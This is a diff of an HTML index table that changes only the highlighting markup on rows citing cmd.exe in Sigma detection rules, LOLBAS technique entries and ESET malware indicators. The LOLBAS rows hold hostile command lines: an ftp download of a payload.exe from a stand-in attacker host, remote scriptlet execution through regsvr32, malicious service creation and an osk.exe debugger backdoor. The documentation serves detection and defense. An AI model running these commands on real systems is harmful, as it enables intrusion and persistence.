+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe</span><span class="nv"> </span><span class="s">/C</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">&gt;</span><span class="nv"> </span><span class="s">\\\\*\\*\\*</span><span class="nv"> </span><span class="s">2&gt;&amp;1'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_execution.yml">win_susp_crackmapexec_execution.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe /C * &gt; *\\Temp\\* 2&gt;&amp;1'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe</span><span class="nv"> </span><span class="s">/C</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">&gt;</span><span class="nv"> </span><span class="s">*\\Temp\\*</span><span class="nv"> </span><span class="s">2&gt;&amp;1'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_explorer_break_proctree.yml">win_susp_explorer_break_proctree.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">description: Detects a command line process that uses explorer.exe /root, which is similar to cmd.exe /c, only it breaks the process tree and makes its parent a new instance of explorer</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">description</span><span class="pi">:</span> <span class="s">Detects a command line process that uses explorer.exe /root, which is similar to cmd.exe /c, only it breaks the process tree and makes its parent a new instance of explorer</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_regsvr32_anomalies.yml">win_susp_regsvr32_anomalies.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">ParentImage: '*\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">ParentImage</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_shell_spawn_from_mssql.yml">win_susp_shell_spawn_from_mssql.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_webshell_recon_detection.yml">win_webshell_recon_detection.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_webshell_spawn.yml">win_webshell_spawn.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_stickykey_like_backdoor.yml">sysmon_stickykey_like_backdoor.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe sethc.exe *'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe</span><span class="nv"> </span><span class="s">sethc.exe</span><span class="nv"> </span><span class="s">*'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_stickykey_like_backdoor.yml">sysmon_stickykey_like_backdoor.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe utilman.exe *'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe</span><span class="nv"> </span><span class="s">utilman.exe</span><span class="nv"> </span><span class="s">*'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_stickykey_like_backdoor.yml">sysmon_stickykey_like_backdoor.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe osk.exe *'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe</span><span class="nv"> </span><span class="s">osk.exe</span><span class="nv"> </span><span class="s">*'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_stickykey_like_backdoor.yml">sysmon_stickykey_like_backdoor.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe Magnify.exe *'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe</span><span class="nv"> </span><span class="s">Magnify.exe</span><span class="nv"> </span><span class="s">*'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_stickykey_like_backdoor.yml">sysmon_stickykey_like_backdoor.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe Narrator.exe *'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe</span><span class="nv"> </span><span class="s">Narrator.exe</span><span class="nv"> </span><span class="s">*'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_stickykey_like_backdoor.yml">sysmon_stickykey_like_backdoor.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe DisplaySwitch.exe *'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe</span><span class="nv"> </span><span class="s">DisplaySwitch.exe</span><span class="nv"> </span><span class="s">*'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/tests/collection_repeat.yml">collection_repeat.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">CommandLine: cmd.exe</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">CommandLine</span><span class="pi">:</span> <span class="s">cmd.exe</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml">Bitsadmin.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml">Bitsadmin.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Description: Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Description</span><span class="pi">:</span> <span class="s">Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml">Bitsadmin.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Description: Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Description</span><span class="pi">:</span> <span class="s">Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml">Bitsadmin.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Complete 1 &amp; bitsadmin /reset</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Complete 1 &amp; bitsadmin /reset</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml">Bitsadmin.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Description: Command for copying cmd.exe to another folder</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Description</span><span class="pi">:</span> <span class="s">Command for copying cmd.exe to another folder</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml">Bitsadmin.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe &amp; bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Reset</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe &amp; bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Reset</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml">Bitsadmin.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Description: One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Description</span><span class="pi">:</span> <span class="s">One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml">Cmd.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Name: Cmd.exe</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Name</span><span class="pi">:</span> <span class="s">Cmd.exe</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml">Cmd.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll &gt; fakefile.doc:payload.bat</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll &gt; fakefile.doc:payload.bat</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml">Cmd.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: cmd.exe - &lt; fakefile.doc:payload.bat</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">cmd.exe - &lt; fakefile.doc:payload.bat</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml">Cmd.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Path: C:\Windows\System32\cmd.exe</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Path</span><span class="pi">:</span> <span class="s">C:\Windows\System32\cmd.exe</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml">Cmd.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Path: C:\Windows\SysWOW64\cmd.exe</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Path</span><span class="pi">:</span> <span class="s">C:\Windows\SysWOW64\cmd.exe</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml">Cmd.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- IOC: cmd.exe executing files from alternate data streams.</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">IOC</span><span class="pi">:</span> <span class="s">cmd.exe executing files from alternate data streams.</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml">Ftp.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: cmd.exe /c "@echo open attacker.com 21&gt;ftp.txt&amp;@echo USER attacker&gt;&gt;ftp.txt&amp;@echo PASS PaSsWoRd&gt;&gt;ftp.txt&amp;@echo binary&gt;&gt;ftp.txt&amp;@echo GET /payload.exe&gt;&gt;ftp.txt&amp;@echo quit&gt;&gt;ftp.txt&amp;@ftp -s:ftp.txt -v"</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">cmd.exe /c "@echo open attacker.com 21&gt;ftp.txt&amp;@echo USER attacker&gt;&gt;ftp.txt&amp;@echo PASS PaSsWoRd&gt;&gt;ftp.txt&amp;@echo binary&gt;&gt;ftp.txt&amp;@echo GET /payload.exe&gt;&gt;ftp.txt&amp;@echo quit&gt;&gt;ftp.txt&amp;@ftp -s:ftp.txt -v"</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Sc.yml">Sc.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works &gt; \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ &amp; sc start evilservice</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works &gt; \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ &amp; sc start evilservice</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: wmic.exe process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">wmic.exe process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Description: Add cmd.exe as a debugger for the osk.exe process. Each time osk.exe is run, cmd.exe will be run as well.</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Description</span><span class="pi">:</span> <span class="s">Add cmd.exe as a debugger for the osk.exe process. Each time osk.exe is run, cmd.exe will be run as well.</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml">Advpack.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: rundll32 advpack.dll, RegisterOCX "cmd.exe /c calc.exe"</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">rundll32 advpack.dll, RegisterOCX "cmd.exe /c calc.exe"</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml">Ieadvpack.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: rundll32 ieadvpack.dll, RegisterOCX "cmd.exe /c calc.exe"</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">rundll32 ieadvpack.dll, RegisterOCX "cmd.exe /c calc.exe"</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml">Shell32.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c echo hi"</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c echo hi"</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Winrm.yml">Winrm.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: 'winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd.exe /k c:\windows\system32\notepad.exe"} -r:http://acmedc:5985   \nwinrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s1">'</span><span class="s">winrm</span><span class="nv"> </span><span class="s">invoke</span><span class="nv"> </span><span class="s">Create</span><span class="nv"> </span><span class="s">wmicimv2/Win32_Service</span><span class="nv"> </span><span class="s">@{Name="Evil";DisplayName="Evil";PathName="cmd.exe</span><span class="nv"> </span><span class="s">/k</span><span class="nv"> </span><span class="s">c:\windows\system32\notepad.exe"}</span><span class="nv"> </span><span class="s">-r:http://acmedc:5985</span><span class="nv">   </span><span class="s">\nwinrm</span><span class="nv"> </span><span class="s">invoke</span><span class="nv"> </span><span class="s">StartService</span><span class="nv"> </span><span class="s">wmicimv2/Win32_Service?Name=Evil</span><span class="nv"> </span><span class="s">-r:http://acmedc:5985'</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml">Mftrace.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: Mftrace.exe cmd.exe</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">Mftrace.exe cmd.exe</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml">Mftrace.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Description: Launch cmd.exe as a subprocess of Mftrace.exe.</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Description</span><span class="pi">:</span> <span class="s">Launch cmd.exe as a subprocess of Mftrace.exe.</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml">Mftrace.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Usecase: Local execution of cmd.exe as a subprocess of Mftrace.exe.</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Usecase</span><span class="pi">:</span> <span class="s">Local execution of cmd.exe as a subprocess of Mftrace.exe.</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc">nukesped_lazarus</a></td>
-      <td><code class="language-plaintext highlighter-rouge">==== cmd.exe /c "%s 2&gt;&gt; %s"</code></td>
+      <td><code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="err">====</span> <span class="ni">cmd</span><span class="err">.</span><span class="ni">exe</span> <span class="p">/</span><span class="err">c</span> <span class="s">"%s 2&gt;&gt; %s"</span></code></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc">nukesped_lazarus</a></td>
-      <td><code class="language-plaintext highlighter-rouge">==== cmd.exe /c "%s &gt;&gt; %s 2&gt;&amp;1"</code></td>
+      <td><code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="err">====</span> <span class="ni">cmd</span><span class="err">.</span><span class="ni">exe</span> <span class="p">/</span><span class="err">c</span> <span class="s">"%s &gt;&gt; %s 2&gt;&amp;1"</span></code></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc">nukesped_lazarus</a></td>
-      <td><code class="language-plaintext highlighter-rouge">==== cmd.exe /c "%s" &gt; %s 2&gt;&amp;1</code></td>
+      <td><code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="err">====</span> <span class="ni">cmd</span><span class="err">.</span><span class="ni">exe</span> <span class="p">/</span><span class="err">c</span> <span class="s">"%s"</span> <span class="err">&gt;</span> <span class="err">%s</span> <span class="m">2</span><span class="err">&gt;</span><span class="mh">&amp;1</span></code></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc">nukesped_lazarus</a></td>
-      <td><code class="language-plaintext highlighter-rouge">==== cmd.exe /c "" &gt; 2&gt;&amp;1 (on stack)</code></td>
+      <td><code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="err">====</span> <span class="ni">cmd</span><span class="err">.</span><span class="ni">exe</span> <span class="p">/</span><span class="err">c</span> <span class="s">""</span> <span class="err">&gt;</span> <span class="m">2</span><span class="err">&gt;</span><span class="mh">&amp;1</span> <span class="p">(</span><span class="ni">on</span> <span class="ni">stack</span><span class="p">)</span></code></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
     </tr>
     <tr>
